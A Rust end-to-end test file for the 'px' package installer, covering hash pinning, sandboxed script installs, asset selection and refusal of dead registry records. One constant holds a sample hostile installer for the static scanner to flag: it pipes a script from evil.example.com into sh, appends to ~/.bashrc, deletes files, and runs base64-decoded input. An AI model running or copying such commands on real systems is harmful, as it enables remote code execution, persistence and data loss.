//! The fake test package: one synthetic app ("pxfake-e2e") exercised through
//! the REAL px binary and the REAL universal pipeline — identity resolution
//! from a local registry, installer-hash pinning (positive AND negative),
//! sandboxed script execution, binary verification, install-DB recording,
//! and method routing. Everything runs against a local HTTP server and
//! isolated XDG dirs: no real system state is touched.

use std::io::{Read, Write};
use std::net::TcpListener;
use std::path::PathBuf;
use std::sync::atomic::{AtomicU16, Ordering};

/// The fake installer: writes a working `pxfake-e2e` binary into $HOME/.local/bin.
const FAKE_INSTALLER: &str = r#"#!/bin/sh
set -e
mkdir -p "$HOME/.local/bin"
printf '#!/bin/sh\necho pxfake-e2e 1.2.3\n' > "$HOME/.local/bin/pxfake-e2e"
chmod +x "$HOME/.local/bin/pxfake-e2e"
"#;

/// A hostile installer: the red-flag patterns the static scanner must catch.
const HOSTILE_INSTALLER: &str = r#"#!/bin/sh
curl -fsSL https://evil.example.com/stage2.sh | sh
echo "pwned" >> ~/.bashrc
rm -rf /tmp/everything
base64 -d <<< "aGkgZGVhciBzeXN0ZW0=" | sh
"#;

/// Minimal HTTP server: serves "/" + path with the given body. One thread.
fn serve(body: &'static [u8]) -> (u16, std::thread::JoinHandle<()>) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let handle = std::thread::spawn(move || {
        for stream in listener.incoming() {
            let mut stream = match stream {
                Ok(s) => s,
                Err(_) => break,
            };
            let mut buf = [0u8; 1024];
            let _ = stream.read(&mut buf);
            let resp = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                body.len()
            );
            let _ = stream.write_all(resp.as_bytes());
            let _ = stream.write_all(body);
            let _ = stream.flush();
        }
    });
    (port, handle)
}

static DIR_N: AtomicU16 = AtomicU16::new(0);

/// Isolated environment for one px run: temp HOME + XDG dirs + a config
/// pointing upstream_registry at a local registry dir.
struct Env {
    home: PathBuf,
    #[allow(dead_code)]
    root: PathBuf,
}

impl Env {
    fn new(registry_dir: &std::path::Path) -> Env {
        let n = DIR_N.fetch_add(1, Ordering::Relaxed);
        let root = std::env::temp_dir().join(format!("px-pxfake-e2e-{n}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let home = root.join("home");
        std::fs::create_dir_all(home.join(".config/px")).unwrap();
        std::fs::create_dir_all(root.join("cache")).unwrap();
        std::fs::create_dir_all(root.join("state")).unwrap();
        std::fs::write(
            home.join(".config/px/config.toml"),
            format!("upstream_registry = \"{}\"\n", registry_dir.display()),
        )
        .unwrap();
        Env { home, root }
    }

    fn run(&self, args: &[&str]) -> (i32, String, String) {
        let out = std::process::Command::new(env!("CARGO_BIN_EXE_px"))
            .args(args)
            .env("HOME", &self.home)
            .env("XDG_CONFIG_HOME", self.home.join(".config"))
            .env("XDG_CACHE_HOME", self.home.join(".cache"))
            .env("XDG_STATE_HOME", self.home.join(".local/state"))
            .env("NO_COLOR", "1")
            .output()
            .expect("px runs");
        (
            out.status.code().unwrap_or(-1),
            String::from_utf8_lossy(&out.stdout).into_owned(),
            String::from_utf8_lossy(&out.stderr).into_owned(),
        )
    }
}

/// Build a local registry with one script-method record for `pxfake-e2e`.
fn build_registry(installer_url: &str, installer_sha: Option<&str>) -> PathBuf {
    use sha2::{Digest, Sha256};
    let sha = installer_sha
        .map(|s| s.to_string())
        .unwrap_or_else(|| format!("{:x}", Sha256::digest(FAKE_INSTALLER.as_bytes())));
    let record = serde_json::json!({
        "canonical_id": "github:px-test/pxfake-e2e",
        "aliases": ["pxfake-e2e", "fake-pkg"],
        "repository": "https://github.com/px-test/pxfake-e2e",
        "description": "the px e2e fake test package",
        "expected_binaries": ["pxfake-e2e"],
        "install_methods": [{
            "method": "script",
            "url": installer_url,
            "installer_sha256": sha,
        }],
        "identity_confidence": 95,
        "security_state": "validated",
    })
    .to_string();
    let n = DIR_N.fetch_add(1, Ordering::Relaxed);
    let dir = std::env::temp_dir().join(format!("px-pxfake-e2e-reg-{n}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    let input = dir.join("apps.jsonl");
    std::fs::write(&input, record).unwrap();
    let out = dir.join("registry");
    let status = std::process::Command::new(env!("CARGO_BIN_EXE_px-registry"))
        .args([
            "build",
            "--input",
            input.to_str().unwrap(),
            "--out",
            out.to_str().unwrap(),
        ])
        .output()
        .expect("builder runs");
    assert!(
        status.status.success(),
        "registry build: {}",
        String::from_utf8_lossy(&status.stderr)
    );
    out
}

// ------------------------------------------------------------ the tests

/// The happy path: registry identity → pinned hash verified → sandboxed
/// installer → binary installed and runnable → install DB records it.
#[test]
fn pxfake_e2e_script_install_end_to_end() {
    let (port, _server) = serve(FAKE_INSTALLER.as_bytes());
    let reg = build_registry(&format!("http://127.0.0.1:{port}/install.sh"), None);
    let env = Env::new(&reg);

    let (code, stdout, stderr) = env.run(&["-y", "install", "pxfake-e2e"]);
    let combined = format!("{stdout}{stderr}");
    assert_eq!(code, 0, "install must succeed\n{combined}");
    assert!(
        combined.contains("resolved pxfake-e2e → github:px-test/pxfake-e2e"),
        "identity resolution: {combined}"
    );
    assert!(
        combined.contains("installer sha256 matches the registry pin"),
        "hash pin verified: {combined}"
    );
    assert!(
        combined.contains("safety scan clean"),
        "static scan ran clean: {combined}"
    );
    assert!(
        combined.contains("installed via installer"),
        "install executed: {combined}"
    );
    assert!(
        combined.contains("binary: pxfake-e2e"),
        "binary verified: {combined}"
    );

    // the binary actually exists and runs
    let bin = env.home.join(".local/bin/pxfake-e2e");
    assert!(bin.exists(), "binary must exist at {}", bin.display());
    let out = std::process::Command::new(&bin).output().unwrap();
    assert_eq!(
        String::from_utf8_lossy(&out.stdout).trim(),
        "pxfake-e2e 1.2.3",
        "the fake binary must actually work"
    );

    // the install DB recorded the full identity
    let ledger = std::fs::read_to_string(env.home.join(".local/state/px/installed.json"))
        .expect("ledger written");
    assert!(
        ledger.contains("px-test/pxfake-e2e"),
        "project recorded: {ledger}"
    );
    assert!(ledger.contains("\"script\""), "method recorded: {ledger}");
    assert!(ledger.contains("pxfake-e2e"), "binary recorded: {ledger}");
}

/// THE security property: a pinned hash that doesn't match the live
/// installer STOPS the install. Never silently execute changed content.
#[test]
fn pxfake_e2e_hash_mismatch_stops_install() {
    let (port, _server) = serve(FAKE_INSTALLER.as_bytes());
    // pin the WRONG hash (of hostile content) — mismatch guaranteed
    let reg = build_registry(
        &format!("http://127.0.0.1:{port}/install.sh"),
        Some(&"b".repeat(64)),
    );
    let env = Env::new(&reg);

    let (code, stdout, stderr) = env.run(&["-y", "install", "pxfake-e2e"]);
    let combined = format!("{stdout}{stderr}");
    assert_ne!(code, 0, "a hash mismatch must fail the install\n{combined}");
    assert!(
        combined.contains("CHANGED since validation") || combined.contains("refusing"),
        "must explain the refusal: {combined}"
    );
    // and nothing was installed
    assert!(
        !env.home.join(".local/bin/pxfake-e2e").exists(),
        "no binary may be installed on hash mismatch"
    );
}

/// The static scanner catches hostile installers before anything executes.
#[test]
fn hostile_installer_is_flagged() {
    let scan = px::security::scan_script_text(HOSTILE_INSTALLER);
    assert_eq!(scan.verdict, px::security::Verdict::Dangerous);
    let flags = scan.flags.join("; ");
    assert!(flags.contains("shell rc file"), "rc persistence: {flags}");
    assert!(flags.contains("base64"), "base64 payload: {flags}");
}

/// Release-asset selection: right arch picked, checksums detected,
/// wrong-arch assets never chosen.
#[test]
fn release_asset_selection() {
    use px::universal::releasebin::*;
    let mk = |names: &[&str]| GhRelease {
        tag_name: "v1.0.0".into(),
        assets: names
            .iter()
            .map(|n| GhAsset {
                name: n.to_string(),
                browser_download_url: format!("https://x/{n}"),
                size: 1,
            })
            .collect(),
    };

    // picks the linux x86_64 tarball over macos/windows/other-arch
    let rel = mk(&[
        "pxfake-e2e-v1.0.0-aarch64-apple-darwin.tar.gz",
        "pxfake-e2e-v1.0.0-x86_64-unknown-linux-musl.tar.gz",
        "pxfake-e2e-v1.0.0-x86_64-pc-windows-msvc.zip",
        "pxfake-e2e-v1.0.0-arm-unknown-linux-gnueabihf.tar.gz",
    ]);
    let picked = pick_asset(&rel, "x86_64").expect("must pick");
    assert!(
        picked.name.contains("x86_64-unknown-linux"),
        "{}",
        picked.name
    );

    // detects a published checksum file
    let rel = mk(&["pxfake-e2e-linux-amd64.tar.gz", "checksums.txt"]);
    let picked = pick_asset(&rel, "x86_64").expect("must pick");
    assert!(picked.name.contains("linux-amd64"));
    assert!(picked.checksum_url.is_some(), "checksum file detected");

    // no linux asset → refuse rather than install a wrong-arch binary
    let rel = mk(&["pxfake-e2e-v1.0.0-aarch64-apple-darwin.tar.gz"]);
    assert!(
        pick_asset(&rel, "x86_64").is_none(),
        "wrong arch must never install"
    );
}

/// Methods whose tools are missing are filtered out of the candidate list.
#[test]
fn unavailable_methods_are_filtered() {
    use px::universal::*;
    let candidates = vec![
        Candidate {
            method: Method::Gem { gem: "x".into() },
            confidence: 100,
            note: String::new(),
            pinned_sha: None,
        },
        Candidate {
            method: Method::Brew { tap: "x/t".into() },
            confidence: 100,
            note: String::new(),
            pinned_sha: None,
        },
        Candidate {
            method: Method::Cargo {
                crate_name: "x".into(),
            },
            confidence: 50,
            note: String::new(),
            pinned_sha: None,
        },
    ];
    let ranked = rank_candidates(candidates);
    // gem/brew aren't installed on this machine → only cargo survives
    assert_eq!(ranked.len(), 1, "missing-tool methods must be filtered");
    assert!(matches!(ranked[0].method, Method::Cargo { .. }));

    // ranking: method rank dominates confidence
    let ranked = rank_candidates(vec![
        Candidate {
            method: Method::Script { url: "u".into() },
            confidence: 100,
            note: String::new(),
            pinned_sha: None,
        },
        Candidate {
            method: Method::Cargo {
                crate_name: "c".into(),
            },
            confidence: 50,
            note: String::new(),
            pinned_sha: None,
        },
    ]);
    assert!(matches!(ranked[0].method, Method::Cargo { .. }));
}

/// Dead records are identity tombstones: px says so and never resolves
/// through a namesake.
#[test]
fn dead_tombstone_refuses_resolution() {
    use px::registry::schema::{RegistryMethod, RegistryRecord};
    // build a registry with one dead record
    let rec = RegistryRecord {
        canonical_id: "github:px-test/deadpkg".into(),
        aliases: vec!["deadpkg".into()],
        repository: "https://github.com/px-test/deadpkg".into(),
        homepage: None,
        description: "gone".into(),
        expected_binaries: vec![],
        install_methods: vec![RegistryMethod {
            method: "script".into(),
            url: Some("https://x".into()),
            installer_sha256: None,
            installer_commit: None,
            version: None,
            release_url: None,
            asset_sha256: None,
            crate_name: None,
            package: None,
            tap: None,
            module: None,
            gem: None,
        }],
        identity_confidence: 100,
        security_state: "dead".into(),
        stars: 0,
        forks: 0,
        repo_created_at: None,
        repo_pushed_at: None,
        latest_release: None,
        latest_release_at: None,
        release_downloads: 0,
        archived: true,
        license: None,
        last_validated_at: None,
        validation_result: None,
        validation_receipt_hash: None,
    };
    let n = DIR_N.fetch_add(1, Ordering::Relaxed);
    let dir = std::env::temp_dir().join(format!("px-dead-reg-{n}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    let input = dir.join("apps.jsonl");
    std::fs::write(&input, serde_json::to_string(&rec).unwrap()).unwrap();
    let out = dir.join("registry");
    let status = std::process::Command::new(env!("CARGO_BIN_EXE_px-registry"))
        .args([
            "build",
            "--input",
            input.to_str().unwrap(),
            "--out",
            out.to_str().unwrap(),
        ])
        .output()
        .unwrap();
    assert!(status.status.success());
    let env = Env::new(&out);
    let (_code, stdout, stderr) = env.run(&["-y", "install", "deadpkg"]);
    let combined = format!("{stdout}{stderr}");
    assert!(
        combined.contains("dead") && combined.contains("refusing"),
        "dead records must be refused with the tombstone explained: {combined}"
    );
}
